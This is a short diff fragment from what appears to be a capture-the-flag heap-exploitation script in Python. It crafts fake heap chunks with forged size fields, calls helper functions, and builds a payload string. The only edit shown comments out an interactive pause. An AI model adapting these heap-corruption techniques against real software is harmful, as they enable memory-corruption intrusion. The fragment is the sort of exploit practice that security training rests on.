@@ -69,7 +69,7 @@ add("\x00" + '\x01'*20,-2147483647,"c"*46,0x50,fake_chunk,"b"*0x30)
 add("\x00" + '\x01'*20,-2147483647,"c"*46,0x10,"d\n","a"*0x10 + b64(0x0) + b64(0x21) +"\n")
 buy(0,2)
 buy(1,1)
-ss = raw_input()
+ss = ""#raw_input()
 war()
 
 payload = "Not today\x00"
